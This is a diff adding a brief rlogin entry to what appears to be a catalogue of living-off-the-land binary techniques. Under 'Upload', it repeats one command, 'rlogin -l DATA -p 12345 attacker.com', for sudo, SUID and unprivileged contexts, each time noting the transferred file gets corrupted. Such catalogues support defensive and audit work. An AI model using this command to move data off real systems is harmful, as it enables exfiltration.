@@ -1,0 +1,17 @@
+rlogin
+======
+
+Upload
+------
+
+[Sudo]
+    rlogin -l DATA -p 12345 attacker.com
+    The file is corrupted by leading and trailing spurious data.
+
+[SUID]
+    rlogin -l DATA -p 12345 attacker.com
+    The file is corrupted by leading and trailing spurious data.
+
+[Unprivileged]
+    rlogin -l DATA -p 12345 attacker.com
+    The file is corrupted by leading and trailing spurious data.
